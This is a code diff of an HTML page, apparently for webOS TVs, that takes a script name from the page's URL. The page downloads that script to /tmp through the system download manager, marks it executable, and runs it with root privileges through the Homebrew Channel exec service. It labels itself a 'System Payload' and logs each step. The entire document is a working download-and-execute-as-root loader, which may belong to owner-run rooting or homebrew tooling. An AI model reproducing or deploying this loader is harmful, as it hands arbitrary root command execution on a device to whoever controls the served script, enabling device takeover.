@@ -2,41 +2,52 @@
 <html>
 <body style="background:#000; color:#00ff00; font-family:monospace; padding:20px;">
     <div id="log">Status: Initializing System Payload...</div>
-    
-    <script src="webOSTV.js"></script> 
+
+    <script src="webOSTV.js"></script>
     <script>
-        function log(str) { document.querySelector('#log').innerText += '\n' + str; }
-        
+        function log(str) {
+            var el = document.querySelector('#log');
+            el.innerText += '\n' + str;
+            console.log('[rbc] ' + str);
+        }
+
         var params = new URLSearchParams(window.location.search);
         var scriptName = params.get('run');
-        var scriptUrl = window.location.origin + "/" + scriptName;
+        var scriptUrl = window.location.origin + '/' + scriptName;
 
-        if (scriptName) {
-            log("Target identified: " + scriptName);
-            
-            // Step 1: Download the script to /tmp using LunaDownloadMgr
+        if (!scriptName) {
+            log('ERROR: No script specified in URL (?run=...)');
+        } else if (typeof webOS === 'undefined' || typeof webOS.service === 'undefined') {
+            log('ERROR: webOS.service not available. Is this running in the facebooklogin browser?');
+        } else {
+            log('Target: ' + scriptUrl);
+
+            // Step 1: Download the script to /tmp/
             webOS.service.request('luna://com.webos.service.downloadmanager', {
                 method: 'download',
                 parameters: {
                     target: scriptUrl,
                     targetDir: '/tmp/',
-                    targetFilename: 'payload.sh',
+                    targetFilename: 'rbc_payload.sh',
                     subscribe: true
                 },
-                onSuccess: function (res) {
+                onSuccess: function(res) {
+                    log('Download response: completed=' + res.completed);
                     if (res.completed) {
-                        log("Download complete. Triggering execution...");
-                        
-                        // Step 2: Execute the script via hbchannel service
+                        log('Download complete. Setting executable and running...');
+
+                        // Step 2: chmod +x then execute via hbchannel root service
                         webOS.service.request('luna://org.webosbrew.hbchannel.service', {
                             method: 'exec',
-                            parameters: { command: 'sh /tmp/payload.sh' },
-                            onSuccess: function() { log("Execution Success."); },
-                            onFailure: function(err) { log("Exec failed: " + JSON.stringify(err)); }
+                            parameters: { command: 'chmod +x /tmp/rbc_payload.sh && sh /tmp/rbc_payload.sh' },
+                            onSuccess: function(r) { log('Exec success: ' + JSON.stringify(r)); },
+                            onFailure: function(err) { log('Exec failed: ' + JSON.stringify(err)); }
                         });
                     }
                 },
-                onFailure: function (err) { log("Download failed: " + JSON.stringify(err)); }
+                onFailure: function(err) {
+                    log('Download failed: ' + JSON.stringify(err));
+                }
             });
         }
     </script>
